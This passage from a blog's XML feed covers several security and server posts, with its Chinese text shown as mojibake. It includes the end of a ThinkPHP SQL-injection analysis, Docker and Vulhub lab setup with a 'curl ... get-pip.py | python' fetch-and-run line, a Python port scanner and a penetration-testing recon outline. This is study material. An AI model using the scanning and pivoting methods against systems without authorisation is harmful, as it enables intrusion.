class="string">"1"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>å½“$val[0] = inc æ—¶ å°†$val[1] ä¸ $var[2] è¿›è¡Œæ‹¼æ¥<br>è™½ç„¶è°ƒç”¨parseKey()å¤„ç† åœ¨thinkphp/library/think/db/builder/Mysql.php:90</p><p>å¯è§å¹¶æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œä¸è¿‡åœ¨æŸäº›æƒ…å†µä¸‹ä¼šç”¨åå¼•å·æŠŠå­—æ®µçš„å€¼åŒ…èµ·æ¥ï¼Œå¯èƒ½ä¼šå½±å“payloadçš„æ„é€ ã€‚</p><p>floatval()æ˜¯å°†æ•°æ®è½¬åŒ–ä¸ºæµ®ç‚¹æ•°<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lx6wd4e5j30gb05nq2z.jpg" alt=""></p><p>æ¥ç€å›åˆ° thinkphp/library/think/db/Query.php çš„ insert ä¸­ï¼š</p><p>åœ¨updata()ä¸­åŒæ ·è°ƒç”¨äº†parseData()å‡½æ•° å› æ­¤åŸç†å’Œåˆ©ç”¨æ˜¯ä¸€æ ·çš„</p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lxdjwnw6j30pm0gkgnc.jpg" alt=""><br>åªæœ‰å½“$val[1]==$keyé”®å€¼æ—¶æ‰èƒ½è¿›è¡Œæ‹¼æ¥</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://bbs.ichunqiu.com/thread-38284-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-38284-1-1.html</a><br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a><br><a href="https://xz.aliyun.com/t/2812#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2812#toc-5</a><br><a href="https://seaii-blog.com/index.php/2018/04/08/80.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2018/04/08/80.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä½¿ç”¨Xshellç©æœåŠ¡å™¨</title>
      <link href="/2019/03/30/%E4%BD%BF%E7%94%A8Xshell%E7%8E%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2019/03/30/%E4%BD%BF%E7%94%A8Xshell%E7%8E%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨æˆ‘ä»¬è´­ä¹°ubuntuæœåŠ¡å™¨æ—¶ é»˜è®¤åªèƒ½ç”¨ubuntuå–ç™»å…¥  å¾ˆå¤šæƒé™å¤šç”¨ä¸äº†<br>æ¥ä¸‹æ¥ä½¿ç”¨Xshellè¿›è¡Œè¿æ¥è¿æ¥æœåŠ¡å™¨</p><h1 id="Xshellè¿æ¥æœåŠ¡å™¨"><a href="#Xshellè¿æ¥æœåŠ¡å™¨" class="headerlink" title="Xshellè¿æ¥æœåŠ¡å™¨"></a>Xshellè¿æ¥æœåŠ¡å™¨</h1><p>åœ¨è…¾è®¯äº‘ä¸‹è½½sshç§˜é’¥(æˆ‘ç”¨çš„æ˜¯è…¾è®¯äº‘çš„æœåŠ¡å™¨)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx6mkz2uj30fj07mwf3.jpg" alt=""></p><p>ç„¶åä½¿ç”¨Xshellè¿æ¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx7gfzizj30ho0f6wgn.jpg" alt=""></p><p>è¾“å…¥å…¬ç½‘ipç„¶åç‚¹å‡»è¿æ¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx7uss7ej30dn06omxt.jpg" alt=""></p><p>ç„¶åå¯¼å…¥ç§˜é’¥å³å¯è¿æ¥æˆåŠŸ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx8ebjjsj30er0bpgnj.jpg" alt=""></p><h1 id="è·å¾—rootæƒé™"><a href="#è·å¾—rootæƒé™" class="headerlink" title="è·å¾—rootæƒé™"></a>è·å¾—rootæƒé™</h1><p>å…ˆç”¨ubuntuç™»å…¥æœåŠ¡å™¨ï¼Œç„¶åæˆ‘ä»¬è¾“å…¥sudo passwd root  è¿›è¡Œä¿®æ”¹rootå¯†ç </p><p>ç„¶åæˆ‘ä»¬è¾“å…¥sudo vi /etc/ssh/sshd_config,å°†ç¬¬äºŒä¸ªæ”¹ä¸ºyes</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxbnbfhrj309k027t8j.jpg" alt=""></p><p>wqä¿å­˜ã€‚</p><p>ç„¶åæˆ‘ä»¬è¾“å…¥sudo service ssh restart ç‚¹å›è½¦ ã€‚æ¥ä¸‹æ¥å°±å¯ä»¥ç”¨rootç™»å…¥äº†</p><p>å¦‚æœåœ¨ç™»å…¥ä¸­ä¸èƒ½ä½¿ç”¨å¯†ç ç™»å…¥çš„è¯,<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxnnusrqj30dx0ch3z2.jpg" alt=""><br>ä¿®æ”¹å¦‚ä¸‹æ–‡ä»¶ï¼š<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure></p><p>å°†è¯¥é…ç½®æ”¹ä¸ºyesï¼š</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxon9xphj30mz0dowft.jpg" alt=""><br>æ¥ç€ä¿å­˜é€€å‡º,ç„¶åé‡å¯sshdæœåŠ¡</p><p>service sshd restart</p><p>ç„¶åç”¨xshellé‡æ–°ç™»é™†ï¼Œå°±å¯ä»¥å‡ºç°è¾“å…¥å¯†ç çš„ç•Œé¢äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dockerå­¦ä¹ </title>
      <link href="/2019/03/28/docker%E5%AD%A6%E4%B9%A0%E5%8F%8AVulhub%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/03/28/docker%E5%AD%A6%E4%B9%A0%E5%8F%8AVulhub%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>åœ¨ubuntuä¸‹<br>1ã€æ›´æ–°ç³»ç»Ÿè½¯ä»¶<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure></p><p>2ã€å®‰è£…ä¾èµ–åŒ…<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> install</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install apt-transport-https</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install ca-certificates</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install curl</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> installsoft ware-properties-common</span><br></pre></td></tr></table></figure></p><p>3ã€æ·»åŠ å®˜æ–¹å¯†é’¥<br>æ‰§è¡Œè¯¥å‘½ä»¤æ—¶ï¼Œå¦‚é‡åˆ°é•¿æ—¶é—´æ²¡æœ‰å“åº”è¯´æ˜ç½‘ç»œè¿æ¥ä¸åˆ°dockerç½‘ç«™ï¼Œéœ€è¦ä½¿ç”¨ä»£-ç†è¿›è¡Œã€‚ï¼ˆå»ºè®®æ›´æ¢æºï¼‰<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>curl -fsSL <span class="symbol">https:</span>/<span class="regexp">/download.docker.com/linux</span><span class="regexp">/ubuntu/gpg</span> | sudo apt-key add -</span><br></pre></td></tr></table></figure></p><p>æ˜¾ç¤ºOK,è¡¨ç¤ºæ·»åŠ æˆåŠŸ.</p><p>4ã€æ·»åŠ ä»“åº“<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo<span class="built_in"> add-apt-repository </span><span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span></span><br></pre></td></tr></table></figure></p><p>5ã€å†æ¬¡æ›´æ–°è½¯ä»¶<br>æˆ‘ä»¬éœ€è¦å†æ¬¡æŠŠè½¯ä»¶æ›´æ–°åˆ°æœ€æ–°ï¼Œå¦åˆ™ä¸‹ä¸€æ­¥æœ‰å¯èƒ½ä¼šæŠ¥é”™ï¼Œï¼ˆubuntuæºè‡ªè¡Œæ›´æ¢ä¸ºå›½å†…æºï¼Œæ¨èé˜¿é‡Œæºï¼‰<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure></p><p>6ã€å®‰è£…docker<br>é»˜è®¤å°±ä¼šå®‰è£…æœ€æ–°ç‰ˆ<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> install docker-ce</span><br></pre></td></tr></table></figure></p><p>7ã€æŸ¥çœ‹dockerç‰ˆæœ¬<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker -v</span><br></pre></td></tr></table></figure></p><p>æ˜¾ç¤ºâ€œDocker version xx.xx.x-ce, build afdb6d4â€å­—æ ·ï¼Œè¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p><p>8.å®‰è£…docker-compose</p><p>pip install docker-compose<br> æ²¡æœ‰pip å»ºè®®å…ˆå®‰è£…pip ï¼ˆpython3å¯é€‰ï¼‰</p><p> curl -s <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a> | python</p><h1 id="ç©è½¬å®¹å™¨ä¸é•œåƒ"><a href="#ç©è½¬å®¹å™¨ä¸é•œåƒ" class="headerlink" title="ç©è½¬å®¹å™¨ä¸é•œåƒ"></a>ç©è½¬å®¹å™¨ä¸é•œåƒ</h1><p>å¯ä»¥å…ˆä½¿ç”¨<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span>   <span class="comment">// æŸ¥çœ‹è¿è¡Œä¸­çš„dockerå®¹å™¨</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›å…¥ä¸€ä¸ªå®¹å™¨<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> docker attach <span class="variable">$id</span></span><br></pre></td></tr></table></figure></p><p>é€€å‡ºå®¹å™¨:<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + <span class="keyword">D</span></span><br></pre></td></tr></table></figure></p><h1 id="åˆ©ç”¨Vulhub"><a href="#åˆ©ç”¨Vulhub" class="headerlink" title="åˆ©ç”¨Vulhub"></a>åˆ©ç”¨Vulhub</h1><p>Vulhubæ˜¯ä¸€ä¸ªé¢å‘å¤§ä¼—çš„å¼€æºæ¼æ´é¶åœºï¼Œæ— éœ€dockerçŸ¥è¯†ï¼Œç®€å•æ‰§è¡Œä¸¤æ¡å‘½ä»¤å³å¯ç¼–è¯‘ã€è¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ¼æ´é¶åœºé•œåƒã€‚æ—¨åœ¨è®©æ¼æ´å¤ç°å˜å¾—æ›´åŠ ç®€å•ï¼Œè®©å®‰å…¨ç ”ç©¶è€…æ›´åŠ ä¸“æ³¨äºæ¼æ´åŸç†æœ¬èº«ã€‚<br>ä¸‹è½½ç¯å¢ƒ<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure></p><p>æ­å»ºä¸€ä¸ªthinkphp çš„æ¼æ´ç¯å¢ƒ</p><p>è¿›å…¥thinkphpç›®å½•ï¼švulhub/thinkphp/in-sqlinjection<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1ix2uwxw1j30nk05w3z6.jpg" alt=""></p><p>ç„¶åè¿è¡Œå¦‚ä¸‹å‘½ä»¤<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿è¡Œå¦‚ä¸‹å‘½ä»¤ æŸ¥çœ‹æ˜ å°„åˆ°å“ªä¸ªç«¯å£ ç„¶åç”¨ å¤–ç½‘+ç«¯å£ è®¿é—®å³å¯<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure></p><p>è¿è¡Œå‘½ä»¤ï¼š docker-compose up -d</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/yeasy/docker_practice/blob/master/SUMMARY.md" target="_blank" rel="noopener">https://github.com/yeasy/docker_practice/blob/master/SUMMARY.md</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>pythonç¼–å†™çš„ç®€å•ç«¯å£æ‰«æå™¨</title>
      <link href="/2019/03/26/python%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E5%8D%95%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
      <url>/2019/03/26/python%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E5%8D%95%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>python3ä¸‹ è¿è¡ŒæˆåŠŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connScan</span><span class="params">(tgtHost, tgtPort)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connSkt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        connSkt.connect((tgtHost, tgtPort))</span><br><span class="line">        print(<span class="string">"[+]%d/tcp open"</span> % tgtPort)</span><br><span class="line">        connSkt.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]%d/tcp close"</span> % tgtPort)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portScan</span><span class="params">(tgtHost)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tgtIP = socket.gethostbyname(tgtHost)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]cannot connect %s"</span> % tgtIP)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tgtName = socket.gethostbyaddr(tgtIP)</span><br><span class="line">        print(<span class="string">"\n[+]Scan results for:"</span> + tgtName[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\n[+]scan results for:"</span> + tgtIP)</span><br><span class="line">        socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">80</span>, <span class="number">90</span>):</span><br><span class="line">            print(<span class="string">"scanning port:"</span> + str(port))</span><br><span class="line">            connScan(tgtHost, int(port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-H"</span>, <span class="string">"--Host"</span>, dest=<span class="string">'tgtHost'</span>, help=<span class="string">'input Host address'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    <span class="keyword">if</span> (tgtHost == <span class="keyword">None</span>):</span><br><span class="line">        print(<span class="string">'----you must input Host-----'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    portScan(tgtHost)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ¸—é€æµ‹è¯•æµç¨‹</title>
      <link href="/2019/03/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2019/03/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è®°å½•ä¸€ä¸‹æ¸—é€æµ‹è¯•çš„ä¸€èˆ¬æµç¨‹,ä»¥å…è‡ªå·±åœ¨æ¸—é€æµ‹è¯•ä¸­é—å¿˜</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>çœŸå®ipæŸ¥è¯¢<br>å¸¸ç”¨çš„å·¥å…·æœ‰å¤šä¸ªåœ°ç‚¹pingæœåŠ¡å™¨-ç½‘ç«™æµ‹é€Ÿ-ç«™é•¿å·¥å…·<br>æœ€é‡è¦çš„å°±æ˜¯ä¿¡æ¯æ”¶é›†<br>ä½¿ç”¨å­—å…¸æšä¸¾ç›®å½•<br>ä½¿ç”¨çˆ¬è™«çˆ¬å–æ•´ä¸ªç½‘ç«™ï¼Œæˆ–è€…ä½¿ç”¨googleç­‰æœç´¢å¼•æ“è·å–<br>æŸ¥çœ‹robots.txtæ˜¯å¦æ³„æ¼<br>æŒ‡çº¹è¯†åˆ«<br>ä½¿åº”ç”¨ç¨‹åºæŠ¥é”™ï¼ŒæŸ¥çœ‹æŠ¥é”™ä¿¡æ¯<br>æ‰«ææœåŠ¡å™¨çš„æ•°æ®åº“ç«¯å£<br>ç”¨åˆ°çš„æ¡†æ¶ï¼šå¾ˆå¤šç½‘ç«™éƒ½åˆ©ç”¨å¼€æºçš„æ¡†æ¶æ¥å¿«é€Ÿå¼€å‘ç½‘ç«™ï¼Œæ‰€ä»¥æ”¶é›†ç½‘ç«™çš„æ¡†æ¶ä¿¡æ¯ä¹Ÿæ˜¯éå¸¸å…³é”®çš„ã€‚</p><h2 id="å­åŸŸå"><a href="#å­åŸŸå" class="headerlink" title="å­åŸŸå"></a>å­åŸŸå</h2><p>æœç´¢å¼•æ“ï¼ˆgoogleï¼Œbaiduï¼Œbingï¼‰,DNSåŒºåŸŸä¼ é€æ¼æ´ï¼Œå­åŸŸåæŒ–æ˜æœºLayer,subDomainsBrute,phpinfo.me,å®šåˆ¶å­—å…¸æš´åŠ›ç ´è§£ã€‚<br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><h2 id="æ—ç«™Cæ®µæŸ¥è¯¢"><a href="#æ—ç«™Cæ®µæŸ¥è¯¢" class="headerlink" title="æ—ç«™Cæ®µæŸ¥è¯¢"></a>æ—ç«™Cæ®µæŸ¥è¯¢</h2><p>æ—ç«™æ˜¯å’Œç›®æ ‡ç½‘ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„å…¶å®ƒçš„ç½‘ç«™ï¼›å¦‚æœä»ç›®æ ‡ç«™æœ¬èº«æ‰¾ä¸åˆ°å¥½çš„å…¥æ‰‹ç‚¹ï¼Œè¿™æ—¶å€™ï¼Œå¦‚æœæƒ³å¿«é€Ÿæ‹¿ä¸‹ç›®æ ‡çš„è¯ï¼Œä¸€èˆ¬éƒ½ä¼šå…ˆæ‰¾ä¸ªç›®æ ‡ç«™ç‚¹æ‰€åœ¨æœåŠ¡å™¨ä¸Šå…¶ä»–çš„æ¯”è¾ƒå¥½æçš„ç«™ä¸‹æ‰‹ï¼Œç„¶åå†æƒ³åŠæ³•è·¨åˆ°çœŸæ­£ç›®æ ‡çš„ç«™ç‚¹ç›®å½•ä¸­ã€‚Cæ®µæ˜¯å’Œç›®æ ‡æœºå™¨ipå¤„åœ¨åŒä¸€ä¸ªCæ®µçš„å…¶å®ƒæœºå™¨ï¼›é€šè¿‡ç›®æ ‡æ‰€åœ¨Cæ®µçš„å…¶ä»–ä»»ä¸€å°æœºå™¨ï¼Œæƒ³åŠæ³•è·¨åˆ°æˆ‘ä»¬çš„ç›®æ ‡æœºå™¨ä¸Šã€‚å¸¸ç”¨çš„å·¥å…·æœ‰webscanccï¼ŒNmapï¼ŒZenmapã€‚</p><h2 id="cmsç±»å‹"><a href="#cmsç±»å‹" class="headerlink" title="cmsç±»å‹"></a>cmsç±»å‹</h2><p>å¯¹ç›®æ ‡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œç›®æ ‡CMSæ˜¯ååˆ†é‡è¦çš„ä¿¡æ¯ï¼Œæœ‰äº†ç›®æ ‡çš„CMSï¼Œå°±å¯ä»¥åˆ©ç”¨ç›¸å…³çš„bugè¿›è¡Œæµ‹è¯•ï¼Œè¿›è¡Œä»£ç å®¡è®¡ã€‚CMSè¯†åˆ«æ–¹å¼æœ‰ç½‘ç«™ç‰¹æœ‰æ–‡ä»¶ï¼Œä¾‹å¦‚/templets/default/style/dedecms.css â€” dedecmsï¼›ç½‘ç«™ç‹¬æœ‰æ–‡ä»¶çš„md5ï¼Œä¾‹å¦‚favicon.icoï¼Œä½†æ˜¯è¯¥æ–‡ä»¶å¯ä»¥è¢«ä¿®æ”¹å¯¼è‡´ä¸å‡†ç¡®ï¼›ç½‘ç«™å‘½åè§„åˆ™ï¼›è¿”å›å¤´çš„å…³é”®å­—ï¼›ç½‘é¡µå…³é”®å­—ï¼›URLç‰¹å¾ï¼›Metaç‰¹å¾ï¼›Scriptç‰¹å¾ï¼›robots.txtï¼›ç½‘ç«™è·¯å¾„ç‰¹å¾ï¼›ç½‘ç«™é™æ€èµ„æºï¼›çˆ¬å–ç½‘ç«™ç›®å½•ä¿¡æ¯ï¼›å¸¸ç”¨çš„å·¥å…·æœ‰ äº‘æ‚‰ï¼Œå·¥å…·1ï¼ŒBugScanerã€‚</p><h2 id="æ•æ„Ÿç›®å½•-æ–‡ä»¶"><a href="#æ•æ„Ÿç›®å½•-æ–‡ä»¶" class="headerlink" title="æ•æ„Ÿç›®å½•/æ–‡ä»¶"></a>æ•æ„Ÿç›®å½•/æ–‡ä»¶</h2><p>ç”¨æ‰«æå™¨æ‰«æç›®å½•ï¼Œè¿™æ—¶å€™ä½ éœ€è¦ä¸€æœ¬å¼ºå¤§çš„å­—å…¸ï¼Œé‡åœ¨å¹³æ—¶ç§¯ç´¯ã€‚å­—å…¸è¶Šå¼ºæ‰«æå¤„çš„ç»“æœå¯èƒ½è¶Šå¤šï¼Œè¿™ä¸€æ­¥ä¸»è¦æ‰«å‡ºç½‘ç«™çš„ç®¡ç†å‘˜å…¥å£ï¼Œä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼ˆ.mdb,.excel,.word,.zip,.rarï¼‰,æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æºä»£ç æ³„éœ²ã€‚å¸¸è§æœ‰.gitæ–‡ä»¶æ³„éœ²ï¼Œ.svnæ–‡ä»¶æ³„éœ²ï¼Œ.DB_storeæ–‡ä»¶æ³„éœ²ï¼ŒWEB-INF/web.xmlæ³„éœ²ã€‚ç›®å½•æ‰«ææœ‰ä¸¤ç§æ–¹å¼ï¼Œä½¿ç”¨ç›®å½•å­—å…¸è¿›è¡Œæš´åŠ›æ‰æ¥å­˜åœ¨è¯¥ç›®å½•æˆ–æ–‡ä»¶è¿”å›200æˆ–è€…403ï¼›ä½¿ç”¨çˆ¬è™«çˆ¬è¡Œä¸»é¡µä¸Šçš„æ‰€æœ‰é“¾æ¥ï¼Œå¯¹æ¯ä¸ªé“¾æ¥è¿›è¡Œå†æ¬¡çˆ¬è¡Œï¼Œæ”¶é›†è¿™ä¸ªåŸŸåä¸‹çš„æ‰€æœ‰é“¾æ¥ï¼Œç„¶åæ€»ç»“å‡ºéœ€è¦çš„ä¿¡æ¯ã€‚å¸¸ç”¨çš„å·¥å…·æœ‰ï¼šå¾¡å‰‘ï¼Œkaliä¸‹çš„dirbï¼ŒDirBruteã€‚</p><h2 id="ç«¯å£ä¿¡æ¯"><a href="#ç«¯å£ä¿¡æ¯" class="headerlink" title="ç«¯å£ä¿¡æ¯"></a>ç«¯å£ä¿¡æ¯</h2><p>æœåŠ¡å’Œå®‰å…¨æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ¯å¼€å¯ä¸€ä¸ªç«¯å£ï¼Œé‚£ä¹ˆæ”»å‡»é¢å°±å¤§äº†ä¸€ç‚¹ï¼Œå¼€å¯çš„ç«¯å£è¶Šå¤šï¼Œä¹Ÿå°±æ„å‘³ç€æœåŠ¡å™¨é¢ä¸´çš„å¨èƒè¶Šå¤§ã€‚å¼€å§‹æ‰«æä¹‹å‰ä¸å¦¨ä½¿ç”¨telnetå…ˆç®€å•æ¢æµ‹ä¸‹æŸäº›ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œé¿å…ä½¿ç”¨æ‰«æå™¨è€Œè¢«å°IPï¼Œæ‰«æå…¨ç«¯å£ä¸€èˆ¬ä½¿ç”¨Nmapï¼Œmasscanè¿›è¡Œæ‰«ææ¢æµ‹ï¼Œå°½å¯èƒ½å¤šçš„æœé›†å¼€å¯çš„ç«¯å£å¥½å·²ç»å¯¹åº”çš„æœåŠ¡ç‰ˆæœ¬ï¼Œå¾—åˆ°ç¡®åˆ‡çš„æœåŠ¡ç‰ˆæœ¬åå¯ä»¥æœç´¢æœ‰æ²¡æœ‰å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ã€‚å¸¸è§çš„ç«¯å£ä¿¡æ¯åŠæ¸—é€æ–¹æ³•ã€‚</p><h2 id="æœåŠ¡å™¨ä¸ä¸­é—´ä»¶ä¿¡æ¯"><a href="#æœåŠ¡å™¨ä¸ä¸­é—´ä»¶ä¿¡æ¯" class="headerlink" title="æœåŠ¡å™¨ä¸ä¸­é—´ä»¶ä¿¡æ¯"></a>æœåŠ¡å™¨ä¸ä¸­é—´ä»¶ä¿¡æ¯</h2><p>é€šè¿‡Nmapã€Zmapç­‰ç«¯å£å’ŒæŒ‡çº¹è¯†åˆ«åŠŸèƒ½æœé›†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ncå’Œtelnetè·å–Bannerä¿¡æ¯è¿›è¡Œè¯†åˆ«ï¼Œå¸¸ç”¨å·¥å…·æœ‰whatweb</p><h1 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" 